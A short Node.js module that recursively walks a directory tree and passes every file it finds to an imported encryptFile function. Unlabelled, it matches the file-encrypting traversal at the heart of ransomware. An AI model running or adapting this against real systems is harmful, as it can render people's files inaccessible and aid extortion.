const fs = require("fs");
const path = require("path");

const encryptFile = require("./generateCrypto");

const findAllFiles = function (dirName) {
  fs.readdir(dirName, (err, files) => {
    if (err) {
      console.log("could not read dir");
    } else {
      files.forEach((file) => {
        const currentPath = path.join(dirName, file);
        fs.stat(currentPath, (err, stats) => {
          if (err) {
            console.log("Invalid file");
          } else if (stats.isDirectory()) {
            findAllFiles(currentPath);
          } else {
            encryptFile(currentPath);
          }
        });
      });
    }
  });
};
module.exports = findAllFiles;
